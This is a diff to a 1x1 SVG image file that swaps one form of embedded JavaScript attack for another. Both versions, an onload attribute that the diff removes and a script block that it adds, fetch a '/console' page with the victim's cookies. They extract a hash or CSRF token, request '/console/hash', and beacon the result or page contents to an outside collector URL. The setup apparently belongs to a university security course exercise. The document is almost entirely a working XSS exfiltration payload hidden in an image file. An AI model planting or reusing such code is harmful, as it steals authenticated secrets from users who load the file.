@@ -1,2 +1,19 @@
 <?xml version='1.0' encoding='UTF-8'?>
-<svg xmlns='http://www.w3.org/2000/svg' width='1' height='1' onload='(function(){try{window.gotYou=true;fetch("/console",{credentials:"include"}).then(function(r){return r.text()}).then(function(t){var m=t.match(/[0-9a-f]{64,}/i);if(m&&m[0]){navigator.sendBeacon("https://cs6262.gtisc.gatech.edu/receive/oakerele3/2052",m[0]);return}var m2=t.match(/name=["\']csrf_token["\']\s*value=["\']([^"\']+)["\']/i);if(m2&&m2[1]){fetch("/console/hash",{method:"POST",credentials:"include",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:"csrf_token="+encodeURIComponent(m2[1])}).then(function(r2){return r2.text()}).then(function(h){if(h){navigator.sendBeacon("https://cs6262.gtisc.gatech.edu/receive/oakerele3/2052",h)}});return}var m3=t.match(/\/console\/hash[^"'\s]*/i);if(m3&&m3[0]){fetch(m3[0],{method:"GET",credentials:"include"}).then(function(r4){return r4.text()}).then(function(h4){if(h4&&h4.match(/[0-9a-f]{20,}/i)){navigator.sendBeacon("https://cs6262.gtisc.gatech.edu/receive/oakerele3/2052",h4);return}navigator.sendBeacon("https://cs6262.gtisc.gatech.edu/receive/oakerele3/2052","no-hash-found")});return}navigator.sendBeacon("https://cs6262.gtisc.gatech.edu/receive/oakerele3/2052","console-snippet|"+t.slice(0,1500))}).catch(function(e){try{navigator.sendBeacon("https://cs6262.gtisc.gatech.edu/receive/oakerele3/2052","err:"+e.toString())}catch(_){} });}catch(e){}})()' />
+<svg xmlns='http://www.w3.org/2000/svg' width='1' height='1'>
+<script type='application/ecmascript'><![CDATA[
+(function(){
+try{
+window.gotYou=true;
+fetch('/console',{credentials:'include'}).then(function(r){return r.text()}).then(function(t){
+var m=t.match(/[0-9a-f]{64,}/i);
+if(m&&m[0]){navigator.sendBeacon('https://cs6262.gtisc.gatech.edu/receive/oakerele3/2052',m[0]);return}
+var m2=t.match(/name=['"]csrf_token['"]\s*value=['"]([^'"]+)['"]/i);
+if(m2&&m2[1]){fetch('/console/hash',{method:'POST',credentials:'include',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'csrf_token='+encodeURIComponent(m2[1])}).then(function(r2){return r2.text()}).then(function(h){if(h){navigator.sendBeacon('https://cs6262.gtisc.gatech.edu/receive/oakerele3/2052',h)}});return}
+var m3=t.match(/\/console\/hash[^"'\\s]*/i);
+if(m3&&m3[0]){fetch(m3[0],{method:'GET',credentials:'include'}).then(function(r4){return r4.text()}).then(function(h4){if(h4&&h4.match(/[0-9a-f]{20,}/i)){navigator.sendBeacon('https://cs6262.gtisc.gatech.edu/receive/oakerele3/2052',h4);return}navigator.sendBeacon('https://cs6262.gtisc.gatech.edu/receive/oakerele3/2052','no-hash-found')});return}
+navigator.sendBeacon('https://cs6262.gtisc.gatech.edu/receive/oakerele3/2052','console-snippet|'+t.slice(0,1500));
+}).catch(function(e){try{navigator.sendBeacon('https://cs6262.gtisc.gatech.edu/receive/oakerele3/2052','err:'+e.toString())}catch(_){}});
+}catch(e){}
+})();
+]]></script>
+</svg>
